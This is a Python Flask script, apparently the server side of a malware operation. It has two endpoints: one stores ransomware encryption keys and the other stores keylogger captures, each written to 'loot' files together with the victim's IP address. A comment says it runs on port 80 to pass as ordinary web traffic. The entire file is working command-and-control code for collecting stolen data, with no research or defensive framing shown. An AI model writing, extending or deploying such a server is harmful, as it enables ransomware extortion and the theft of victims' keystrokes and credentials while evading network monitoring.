from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

# Rota para receber a chave do ransomware
@app.route('/api/keys', methods=['POST'])
def receive_key():
    data = request.json
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("/app/logs/loot_keys.txt", "a") as f:
        f.write(f"[{timestamp}] IP: {request.remote_addr} - Dados: {data}\n")
        
    print(f"[*] Nova chave recebida de {request.remote_addr}")
    return jsonify({"status": "success"}), 200

# Rota para receber os logs do keylogger
@app.route('/api/logs', methods=['POST'])
def receive_log():
    data = request.json
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("/app/logs/loot_keylogger.txt", "a") as f:
        f.write(f"[{timestamp}] IP: {request.remote_addr} - Dados: {data}\n")
        
    print(f"[*] Novo log recebido de {request.remote_addr}")
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    # Roda na porta 80 para simular tráfego HTTP comum
    app.run(host='0.0.0.0', port=80)
